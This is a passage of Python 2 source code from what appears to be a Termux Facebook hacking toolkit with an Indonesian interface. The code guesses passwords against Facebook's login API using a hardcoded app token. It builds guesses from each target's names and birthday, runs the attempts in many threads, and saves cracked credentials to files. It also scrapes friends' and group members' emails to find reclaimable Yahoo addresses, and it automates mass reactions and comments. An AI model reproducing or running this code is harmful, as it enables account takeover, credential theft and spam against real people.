							cek.write(user +" | "+ pass5 +"\n")
							cek.close()
							cekpoint.append(user+pass5)
						else:
							pass6 = bi["last_name"] +"12345"
							data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass6) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
								z = json.loads(x.text)
								print h +"✔ "+ user + u +" | "+ h + pass6 + u +" => "+ n + z["name"]
								kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
								kec.write(user +" | "+ pass6 +" => "+ z["name"] +"\n")
								kec.close()
								oks.append(user+pass6)
							elif "www.facebook.com" in q["error_msg"]:
								print m +"✘ "+ user + u +" | "+ m + pass6
								cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
								cek.write(user +" | "+ pass6 +"\n")
								cek.close()
								cekpoint.append(user+pass6)
							else:
								lahir = bi["birthday"]
								pass7 = lahir.replace("/", "")
								data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass7) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if "access_token" in q:
									x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
									z = json.loads(x.text)
									print h +"✔ "+ user + u +" | "+ h + pass7 + u +" => "+ n + z["name"]
									kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
									kec.write(user +" | "+ pass7 +" => "+ z["name"] +"\n")
									kec.close()
									oks.append(user+pass7)
								elif "www.facebook.com" in q["error_msg"]:
									print m +"✘ "+ user + u +" | "+ m + pass7
									cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
									cek.write(user +" | "+ pass7 +"\n")
									cek.close()
									cekpoint.append(user+pass7)
								else:
									pass8 = "sayang"
									data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass8) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
										z = json.loads(x.text)
										print h +"✔ "+ user + u +" | "+ h + pass8 + u +" => "+ n + z["name"]
										kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
										kec.write(user +" | "+ pass8 +" => "+ z["name"] +"\n")
										kec.close()
										oks.append(user+pass8)
									elif "www.facebook.com" in q["error_msg"]:
										print m +"✘ "+ user + u +" | "+ m + pass8
										cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
										cek.write(user +" | "+ pass8 +"\n")
										cek.close()
										cekpoint.append(user+pass8)
									else:
										pass9 = "sayang123"
										data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass9) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										q = json.load(data)
										if "access_token" in q:
											x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
											z = json.loads(x.text)
											print h +"✔ "+ user + u +" | "+ h + pass9 + u +" => "+ n + z["name"]
											kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
											kec.write(user +" | "+ pass9 +" => "+ z["name"] +"\n")
											kec.close()
											oks.append(user+pass9)
										elif "www.facebook.com" in q["error_msg"]:
											print m +"✘ "+ user + u +" | "+ m + pass9
											cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
											cek.write(user +" | "+ pass9 +"\n")
											cek.close()
											cekpoint.append(user+pass9)
										else:
											pass10 = "anjing"
											data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass10) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
												z = json.loads(x.text)
												print h +"✔ "+ user + u +" | "+ h + pass10 + u +" => "+ n + z["name"]
												kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
												kec.write(user +" | "+ pass10 +" => "+ z["name"] +"\n")
												kec.close()
												oks.append(user+pass10)
											elif "www.facebook.com" in q["error_msg"]:
												print m +"✘ "+ user + u +" | "+ m + pass10
												cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
												cek.write(user +" | "+ pass10 +"\n")
												cek.close()
												cekpoint.append(user+pass10)
											else:
												pass11 = "anjing123"
												data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass11) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												q = json.load(data)
												if "access_token" in q:
													x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
													z = json.loads(x.text)
													print h +"✔ "+ user + u +" | "+ h + pass11 + u +" => "+ n + z["name"]
													kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
													kec.write(user +" | "+ pass11 +" => "+ z["name"] +"\n")
													kec.close()
													oks.append(user+pass11)
												elif "www.facebook.com" in q["error_msg"]:
													print m +"✘ "+ user + u +" | "+ m + pass11
													cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
													cek.write(user +" | "+ pass11 +"\n")
													cek.close()
													cekpoint.append(user+pass11)
	
	
	p = ThreadPool(30)
	p.map(main, id)
	print u + 53 * "═"
	print n +"• "+ k +"Jumlah"+ h +" Berhasil "+ n +"&"+ m +" Checkpoint "+ n +": "+ h + tebal + str(len(oks)) + n +" & "+ m + tebal + str(len(cekpoint)) + n
	print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Berhasil.txt"+ n +" Dan "+ m + tebal +"Checkpoint.txt"+ n
	enter()
	super()


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
def crack():
	global file, idlist, passw
	logo()
	idlist = raw_input (u +"›"+ k +" File Daftar Id Profil "+ n +": ")
	passw = raw_input (u +"›"+ h +" Kata Sandi "+ n +": ")
	print ""
	try:
		file = open (idlist, "r")
		for x in range(40):
			zedd = threading.Thread(target=scrak, args=())
			zedd.start()
			threads.append(zedd)
		for zedd in threads:
			zedd.join()
	except IOError:
		print m +"✘ File Id Tidak Ditemukan"
		sleep (5)
		menu_hack()


def scrak():
	up = open (idlist, "r").read().split()
	while file:
		username = file.readline().strip()
		data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (username) +"&locale=en_US&password="+ (passw) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		mpsh = json.load(data)
		if back == (len(up)):
			break
		if "access_token" in mpsh:
			x = get ("https://graph.facebook.com/"+ username +"?access_token="+ mpsh["access_token"])
			z = json.loads(x.text)
			berhasil.append(h +"✔ "+ username + u +" | "+ h + passw + u +" => "+ n + z["name"])
			bisa = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
			bisa.write(username +" | "+ passw +" => "+ z["name"] +"\n")
			bisa.close()
		elif "www.facebook.com" in mpsh["error_msg"]:
			cekpoint.append(m +"✘ "+ username + u +" | "+ m + passw)
			cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
			cek.write(username +" | "+ passw +"\n")
			cek.close()
		else:
			gagal.append(username)
			back += 1
		sys.stdout.write(n +"\r• "+ k +"Jumlah Id "+ n +": "+ p + str(back) + n +" => "+ b + str(len(up)) + u +" | "+ h +"✔ "+ n +": "+ h + str(len(berhasil)) + c +" & "+ m +"✘ "+ n +": "+ m + str(len(cekpoint)))
		sys.stdout.flush()
	print u + 53 * "═"
	print berhasil
	print cekpoint
	print str(len(gagal))
	print u + 53 * "═"
	print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Berhasil.txt"+ n +" Dan "+ m + tebal +"Checkpoint.txt"+ n
	enter()
	menu_hack()


def mini():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	print ""
	try:
		rmini = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
		amini = json.loads(rmini.text)
		print h +"✔ "+ k +"Nama "+ n +": "+ h + amini["name"]
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		menu_hack()
	r = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
	a = json.loads(r.text)
	
	
	pz1 = a["first_name"] +"123"
	data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz1) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	y = json.load(data)
	if "access_token" in y:
		print h +"✔ "+ id + u +" | "+ h + pz1 + u +" => "+ n + a["name"]
		enter()
		menu_hack()
	elif "www.facebook.com" in y["error_msg"]:
		print m +"✘ "+ id + u +" | "+ m + pz1 + u +" => "+ n + a["name"]
		enter()
		menu_hack()
	else:
		pz2 = a["first_name"] +"12345"
		data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz2) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if "access_token" in y:
			print h +"✔ "+ id + u +" | "+ h + pz2 + u +" => "+ n + a["name"]
			enter()
			menu_hack()
		elif "www.facebook.com" in y["error_msg"]:
			print m +"✘ "+ id + u +" | "+ m + pz2 + u +" => "+ n + a["name"]
			enter()
			menu_hack()
		else:
			pz3 = a["middle_name"] +"123"
			data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz3) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			y = json.load(data)
			if "access_token" in y:
				print h +"✔ "+ id + u +" | "+ h + pz3 + u +" => "+ n + a["name"]
				enter()
				menu_hack()
			elif "www.facebook.com" in y["error_msg"]:
				print m +"✘ "+ id + u +" | "+ m + pz3 + u +" => "+ n + a["name"]
				enter()
				menu_hack()
			else:
				pz4 = a["middle_name"] +"12345"
				data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz4) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if "access_token" in y:
					print h +"✔ "+ id + u +" | "+ h + pz4 + u +" => "+ n + a["name"]
					enter()
					menu_hack()
				elif "www.facebook.com" in y["error_msg"]:
					print m +"✘ "+ id + u +" | "+ m + pz4 + u +" => "+ n + a["name"]
					enter()
					menu_hack()
				else:
					pz5 = a["last_name"] +"123"
					data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz5) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					y = json.load(data)
					if "access_token" in y:
						print h +"✔ "+ id + u +" | "+ h + pz5 + u +" => "+ n + a["name"]
						enter()
						menu_hack()
					elif "www.facebook.com" in y["error_msg"]:
						print m +"✘ "+ id + u +" | "+ m + pz5 + u +" => "+ n + a["name"]
						enter()
						menu_hack()
					else:
						pz6 = a["last_name"] +"12345"
						data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz6) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if "access_token" in y:
							print h +"✔ "+ id + u +" | "+ h + pz6 + u +" => "+ n + a["name"]
							enter()
							menu_hack()
						elif "www.facebook.com" in y["error_msg"]:
							print m +"✘ "+ id + u +" | "+ m + pz6 + u +" => "+ n + a["name"]
							enter()
							menu_hack()
						else:
							lahir = a["birthday"]
							pz7 = lahir.replace("/", "")
							data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (id) +"&locale=en_US&password="+ (pz7) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							y = json.load(data)
							if "access_token" in y:
								print h +"✔ "+ id + u +" | "+ h + pz7 + u +" => "+ n + a["name"]
								enter()
								menu_hack()
							elif "www.facebook.com" in y["error_msg"]:
								print m +"✘ "+ id + u +" | "+ m + pz7 + u +" => "+ n + a["name"]
								enter()
								menu_hack()
							else:
								print m +"✘ Gagal Membuka Kata Sandi Dari " tebal + a["name"] + n
								sleep (5)
								menu_hack()


def brute():
	logo()
	toket = open ("Token.txt", "r").read()
	email = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	passw = raw_input (u +"›"+ h +" File Daftar Kata Sandi "+ n +": ")
	print ""
	try:
		bukao = open (passw, "r")
		total = bukao.readlines()
		print n +"• "+ k +"Jumlah Daftar Kata Sandi "+ n +": "+ h + str(len(total))
		pw = bukao.replace("\n", "")
		sys.stdout.write(n +"\r• "+ h +"Mencoba Kata Sandi "+ n +": "+ k + pw)
		sys.stdout.flush()
		data = get ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (email) +"&locale=en_US&password="+ (pw) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		mpsh = json.loads(data.text)
		rb = get ("https://graph.facebook.com/"+ email +"?access_token="+ toket)
		ab = json.loads(rb.text)
		if "access_token" in mpsh:
			print h +"✔ "+ email + u +" | "+ h + pw + u +" => "+ n + ab["name"]
			enter()
			menu_hack()
		elif "www.facebook.com" in mpsh["error_msg"]:
			print m +"✘ "+ email + u +" | "+ m + pw + u +" => "+ n + ab["name"]
			enter()
			menu_hack()
	except IOError:
		print m +"✘ File Daftar Kata Sandi Tidak Ditemukan"
		sleep (5)
		menu_hack()


def menu_yahoo():
	logo()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Email Yahoo Teman"
	print u +"║"+ k +"02"+ u +"║"+ k +" Email Yahoo Temannya Dari Teman"
	print u +"║"+ m +"03"+ u +"║"+ m +" Email Yahoo Anggota Grub"
	print u +"║"+ c +"04"+ u +"║"+ c +" Email Yahoo (Memerlukan File Daftar Email)"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	go = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if go == "01" or go == "1":
		yahoofriends()
	elif go == "02" or go == "2":
		yahoofromfriends()
	elif go == "03" or go == "3":
		yahoomember()
	elif go == "04" or go == "4":
		yahoolist()
	elif go == "09" or go == "9":
		menu_hack()
	else:
		salah()
		menu_yahoo()


def yahoofriends():
	logo()
	toket = open ("Token.txt", "r").read()
	mpsh = []
	jml = 0
	teman = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
	kimak = json.loads(teman.text)
	save = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
	for w in kimak["data"]:
		jml += 1
		mpsh.append(jml)
		id = w["id"]
		nama = w["name"]
		links = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
		z = json.loads(links.text)
		try:
			mail = z["email"]
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if "yahoo.com" in otw:
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print h +"✔ "+ mail + u +" => "+ n + nama
					save.write(mail +" => "+ nama +"\n")
					berhasil.append(mail)
		except KeyError:
			pass
	save.close()
	print u + 53 * "═"
	print n +"• "+ k +"Jumlah Email Yahoo "+ n +": "+ h + str(len(berhasil))
	print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Yahoo.txt"+ n
	enter()
	menu_yahoo()


def yahoofromfriends():
	logo()
	toket = open ("Token.txt", "r").read()
	mpsh = []
	jml = 0
	idt = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	print ""
	try:
		jok = get ("https://graph.facebook.com/"+ idt +"?access_token="+ toket)
		op = json.loads(jok.text)
		print h +"✔ Id Temannya Dari "+ op["name"]
		teman = get ("https://graph.facebook.com/"+ idt +"/friends?access_token="+ toket)
		kimak = json.loads(teman.text)
		save = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
		for w in kimak["data"]:
			jml += 1
			mpsh.append(jml)
			id = w["id"]
			nama = w["name"]
			links = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
			z = json.loads(links.text)
			try:
				mail = z["email"]
				yahoo = re.compile(r'@.*')
				otw = yahoo.search(mail).group()
				if "yahoo.com" in otw:
					br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
					br._factory.is_html = True
					br.select_form(nr=0)
					br["username"] = mail
					klik = br.submit().read()
					jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
					try:
						pek = jok.search(klik).group()
					except:
						continue
					if '"messages.ERROR_INVALID_USERNAME">' in pek:
						print h +"✔ "+ mail + u +" => "+ n + nama
						save.write(mail +" => "+ nama +"\n")
						berhasil.append(mail)
			except KeyError:
				pass
		save.close()
		print u + 53 * "═"
		print n +"• "+ k +"Jumlah Email Yahoo "+ n +": "+ h + str(len(berhasil))
		print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
		print b +"  Dengan Nama "+ h + tebal +"Yahoo.txt"+ n
		enter()
		menu_yahoo()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		menu_yahoo()


def yahoomember():
	logo()
	toket = open ("Token.txt", "r").read()
	mpsh = []
	jml = 0
	id = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	print ""
	try:
		r = get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket)
		asw = json.loads(r.text)
		print h +"✔ Id Anggota Grup "+ asw["name"]
		teman = get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket)
		kimak = json.loads(teman.text)
		save = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
		for w in kimak["data"]:
			jml += 1
			mpsh.append(jml)
			id = w["id"]
			nama = w["name"]
			links = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
			z = json.loads(links.text)
			try:
				mail = z["email"]
				yahoo = re.compile(r'@.*')
				otw = yahoo.search(mail).group()
				if "yahoo.com" in otw:
					br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
					br._factory.is_html = True
					br.select_form(nr=0)
					br["username"] = mail
					klik = br.submit().read()
					jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
					try:
						pek = jok.search(klik).group()
					except:
						continue
					if '"messages.ERROR_INVALID_USERNAME">' in pek:
						print h +"✔ "+ mail + u +" => "+ n + nama
						save.write(mail +" => "+ nama +"\n")
						berhasil.append(mail)
			except KeyError:
				pass
		save.close()
		print u + 53 * "═"
		print n +"• "+ k +"Jumlah Email Yahoo "+ n +": "+ h + str(len(berhasil))
		print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
		print b +"  Dengan Nama "+ h + tebal +"Yahoo.txt"+ n
		enter()
		menu_yahoo()
	except KeyError:
		print m +"✘ Id Grup Tidak Ditemukan"
		sleep (5)
		menu_yahoo()


def yahoolist():
	logo()
	files = raw_input (u +"›"+ k +" File Daftar Id Profil "+ n +": ")
	print ""
	try:
		mail = open (files, "r").readlines()
		mpsh = []
		jml = 0
		save = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
		for pw in mail:
			mail = pw.replace("\n","")
			jml += 1
			mpsh.append(jml)
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if "yahoo.com" in otw:
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print h +"✔ "+ mail + u +" => "+ n + nama
					save.write(mail +" => "+ nama +"\n")
					berhasil.append(mail)
		save.close()
		print u + 53 * "═"
		print n +"• "+ k +"Jumlah Email Yahoo "+ n +": "+ h + str(len(berhasil))
		print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
		print b +"  Dengan Nama "+ h + tebal +"Yahoo.txt"+ n
		enter()
		menu_yahoo()
	except IOError:
		print m +"✘ File Daftar Email Tidak Ditemukan"
		sleep (5)
		menu_yahoo()


def menu_bot():
	logo()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ n +"01"+ u +"║"+ n +" Reactions Postingan Profil"
	print u +"║"+ c +"02"+ u +"║"+ c +" Reactions Postingan Grup"
	print u +"║"+ m +"03"+ u +"║"+ m +" Mengomentari Postingan Profil"
	print u +"║"+ h +"04"+ u +"║"+ h +" Mengomentari Postingan Grup"
	print u +"║"+ k +"05"+ u +"║"+ k +" Menghapus Semua Postingan"
	print u +"║"+ p +"06"+ u +"║"+ p +" Konfirmasi Permintaan Pertemanan"
	print u +"║"+ b +"07"+ u +"║"+ b +" Menghapus Semua Pertemanan"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	bots = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if bots == "01" or bots == "1":
		menu_react()
	elif bots == "02" or bots == "2":
		grup_react()
	elif bots == "03" or bots == "3":
		bot_komen()
	elif bots == "04" or bots == "4":
		grup_komen()
	elif bots == "05" or bots == "5":
		deletepost()
	elif bots == "06" or bots == "6":
		accept()
	elif bots == "07" or bots == "7":
		unfriend()
	elif bots == "09" or bots == "9":
		menu()
	else:
		salah()
		menu_bot()


def logo_react():
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ b +"01"+ u +"║"+ b +" Suka"
	print u +"║"+ p +"02"+ u +"║"+ p +" Super"
	print u +"║"+ h +"03"+ u +"║"+ h +" Haha"
	print u +"║"+ h +"04"+ u +"║"+ h +" Wow"
	print u +"║"+ k +"05"+ u +"║"+ k +" Sedih"
	print u +"║"+ m +"06"+ u +"║"+ m +" Marah"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	

reaksi = []
def menu_react():
	logo()
	toket = open ("Token.txt", "r").read()
	logo_react()
	aksi = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if aksi == "01" or aksi == "1":
		tipe = "LIKE"
	elif aksi == "02" or aksi == "2":
		tipe = "LOVE"
	elif aksi == "03" or aksi == "3":
		tipe = "HAHA"
	elif aksi == "04" or aksi == "4":
		tipe = "WOW"
	elif aksi == "05" or aksi == "5":
		tipe = "SAD"
	elif aksi == "06" or aksi == "6":
		tipe = "ANGRY"
	elif aksi == "09" or aksi == "9":
		menu_bot()
	else:
		salah()
		menu_react()
	
	
	ide = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	limit = raw_input (u +"›"+ h +" Jumlah Reactions"+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/"+ ide +"?access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Reactions "+ b + tipe + h +"Ke "+ n +": "+ h + jl["name"]
		oh = get ("https://graph.facebook.com/"+ ide +"?fields=feed.limit("+ limit +")&access_token="+ toket)
		ah = json.loads(oh.text)
		for a in ah["feed"]["data"]:
			y = a["id"]
			reaksi.append(y)
			post ("https://graph.facebook.com/"+ y +"/reactions?type="+ tipe +"&access_token="+ toket)
			print h +"\r✔ "+ y.replace("\n", " ") +" "+ tipe,
		print u +"\r•"+ k +" Jumlah Reactions "+ tipe + n +": "+ h + str(len(reaksi))
		enter()
		menu_react()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		menu_react()


reaksigrup = []
def grup_react():
	logo()
	toket = open ("Token.txt", "r").read()
	logo_react()
	aksi = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if aksi == "01" or aksi == "1":
		tipe = "LIKE"
	elif aksi == "02" or aksi == "2":
		tipe = "LOVE"
	elif aksi == "03" or aksi == "3":
		tipe = "HAHA"
	elif aksi == "04" or aksi == "4":
		tipe = "WOW"
	elif aksi == "05" or aksi == "5":
		tipe = "SAD"
	elif aksi == "06" or aksi == "6":
		tipe = "ANGRY"
	elif aksi == "09" or aksi == "9":
		menu_bot()
	else:
		salah()
		menu_react()
	
	
	ide = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	limit = raw_input (u +"›"+ h +" Jumlah Reactions"+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/group/?id="+ ide +"&access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Reactions "+ b + tipe + h +"Ke "+ n +": "+ h + jl["name"]
		oh = get ("https://graph.facebook.com/v3.0/"+ ide +"?fields=feed.limit("+ limit +")&access_token="+ toket)
		ah = json.loads(oh.text)
		for a in ah["feed"]["data"]:
			y = a["id"]
			reaksigrup.append(y)
			post ("https://graph.facebook.com/"+ y +"/reactions?type="+ tipe +"&access_token="+ toket)
			print h +"\r✔ "+ y.replace("\n", " ") +" "+ tipe,
		print u +"\r•"+ k +" Jumlah Reactions "+ tipe + n +": "+ h + str(len(reaksigrup))
		enter()
		menu_react()
	except KeyError:
		print m +"✘ Id Grup Tidak Ditemukan"
		sleep (5)
		menu_react()


komen = []
def bot_komen():
	logo()
	toket = open ("Token.txt", "r").read()
	print n +"• Gunakan Tanda "+ h + tebal +"<>"+ n +" Untuk Membuat Baris Baru"
	ide = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	km = raw_input (u +"›"+ h +" Mengomentari "+ n +": ")
	limit = raw_input (u +"›"+ p +" Jumlah Komentar"+ n +": ")
	km = km.replace("<>", "\n")
	print ""
	try:
		rg = get ("https://graph.facebook.com/"+ ide +"?access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Komentar Ke "+ n +": "+ h + jl["name"]
		oh = get ("https://graph.facebook.com/"+ ide +"?fields=feed.limit("+ limit +")&access_token="+ toket)
		ah = json.loads(oh.text)
		for a in ah["feed"]["data"]:
			y = a["id"]
			komen.append(y)
			post ("https://graph.facebook.com/"+ y +"/comments?message="+ km +"&access_token="+ toket)
			print h +"\r✔ "+ y.replace("\n", " ") +" "+ km[:10].replace("\n", " ") +"..."
		print u +"\r•"+ k +" Jumlah Komentar "+ n +": "+ h + str(len(komen))
		enter()
		menu_bot()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		menu_bot()


komengrup = []
def grup_komen():
	logo()
	toket = open ("Token.txt", "r").read()
	print n +"• Gunakan Tanda "+ h + tebal +"<>"+ n +" Untuk Membuat Baris Baru"
	ide = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	km = raw_input (u +"›"+ h +" Mengomentari "+ n +": ")
	limit = raw_input (u +"›"+ p +" Jumlah Komentar"+ n +": ")
	km = km.replace("<>", "\n")
	print ""
	try:
		rg = get ("https://graph.facebook.com/group/?id="+ ide +"&access_token="+ toket)
		jl = json.loads(rg.text)
